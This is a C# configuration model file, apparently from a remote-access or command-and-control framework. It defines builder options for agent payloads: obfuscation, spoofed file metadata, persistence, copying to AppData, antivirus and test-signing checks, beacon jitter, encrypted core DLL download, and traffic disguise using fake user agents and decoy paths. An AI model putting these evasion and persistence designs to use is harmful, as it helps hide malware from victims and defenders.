namespace LibraNextgen.Common.Models;

public class BuildConfigRequest
{
    public string Platform { get; set; } = "x64";
    public string ApplicationType { get; set; } = "Console";
    public string ServerHost { get; set; } = "127.0.0.1";
    public int ServerPort { get; set; } = 5270;
    public bool EnableObfuscation { get; set; }
    public bool InjectJunkData { get; set; }
    public int JunkDataMb { get; set; } = 10;
    public string? IconUrl { get; set; }
    public string? CompanyName { get; set; }
    public string? FileDescription { get; set; }
    public string? ProductName { get; set; }
    public string? Copyright { get; set; }
    public string? FileVersion { get; set; }
    public bool StripSymbols { get; set; } = true;
    public bool RequireAdmin { get; set; }
    public bool CopyToAppData { get; set; }
    public bool EnablePersistence { get; set; }
    public AntiAnalysisConfig AntiAnalysis { get; set; } = new();

    // ── 流量伪装（构建时注入，注册后服务端 profile 可覆盖）────────────

    /// UA 轮换列表（每行一个完整浏览器 UA）。
    public List<string> UserAgents { get; set; } = new()
    {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
    };

    /// 附加请求头（每行 "Name: value"）。
    public List<string> ExtraHeaders { get; set; } = new()
    {
        "Accept: application/json, text/plain, */*",
        "Accept-Language: zh-CN,zh;q=0.9,en;q=0.8",
        "X-Requested-With: XMLHttpRequest",
    };

    /// 虚假业务路径后缀（每行一个，agent 请求时随机拼到入口后）。
    public List<string> PathSuffixes { get; set; } = new()
    {
        "user/info", "orders/list", "profile", "settings",
        "notifications", "messages/unread", "search/history", "dashboard/stats",
    };
}

public class AntiAnalysisConfig
{
    [System.Text.Json.Serialization.JsonPropertyName("enabled")]
    public bool enabled { get; set; }

    [System.Text.Json.Serialization.JsonPropertyName("check_test_signing")]
    public bool check_test_signing { get; set; } = true;

    [System.Text.Json.Serialization.JsonPropertyName("check_av_processes")]
    public bool check_av_processes { get; set; } = true;
}

public class InjectedConfig
{
    [System.Text.Json.Serialization.JsonPropertyName("server_url")]
    public string server_url { get; set; } = "";

    [System.Text.Json.Serialization.JsonPropertyName("register_path")]
    public string register_path { get; set; } = "";

    [System.Text.Json.Serialization.JsonPropertyName("heartbeat_path")]
    public string heartbeat_path { get; set; } = "";

    [System.Text.Json.Serialization.JsonPropertyName("result_path")]
    public string result_path { get; set; } = "";

    [System.Text.Json.Serialization.JsonPropertyName("ws_path")]
    public string ws_path { get; set; } = "";

    [System.Text.Json.Serialization.JsonPropertyName("heartbeat_interval_ms")]
    public ulong heartbeat_interval_ms { get; set; } = 3000;

    [System.Text.Json.Serialization.JsonPropertyName("jitter_percent")]
    public double jitter_percent { get; set; } = 0.2;

    [System.Text.Json.Serialization.JsonPropertyName("require_admin")]
    public bool require_admin { get; set; }

    [System.Text.Json.Serialization.JsonPropertyName("copy_to_path")]
    public string? copy_to_path { get; set; }

    [System.Text.Json.Serialization.JsonPropertyName("enable_persistence")]
    public bool enable_persistence { get; set; }

    /// Server path to download the encrypted core DLL
    [System.Text.Json.Serialization.JsonPropertyName("core_download_path")]
    public string core_download_path { get; set; } = "";

    /// Server path to negotiate the core decryption key (removes embedded RSA key)
    [System.Text.Json.Serialization.JsonPropertyName("core_key_path")]
    public string core_key_path { get; set; } = "/api/beacon/core-key";

    /// Shared secret presented during registration to authenticate the agent.
    [System.Text.Json.Serialization.JsonPropertyName("beacon_secret")]
    public string beacon_secret { get; set; } = "";

    /// Anti-analysis configuration (sandbox/VM/debug detection)
    [System.Text.Json.Serialization.JsonPropertyName("anti_analysis")]
    public AntiAnalysisConfig? anti_analysis { get; set; }

    // ── 流量伪装（构建时注入）────────────────────────────────────────

    [System.Text.Json.Serialization.JsonPropertyName("user_agents")]
    public List<string> user_agents { get; set; } = new();

    [System.Text.Json.Serialization.JsonPropertyName("extra_headers")]
    public List<string> extra_headers { get; set; } = new();

    [System.Text.Json.Serialization.JsonPropertyName("path_suffixes")]
    public List<string> path_suffixes { get; set; } = new();

    /// 服务端 RSA 公钥（SPKI DER b64，构建时注入，注册/密钥协商混合加密用）
    [System.Text.Json.Serialization.JsonPropertyName("server_public_key")]
    public string server_public_key { get; set; } = "";
}
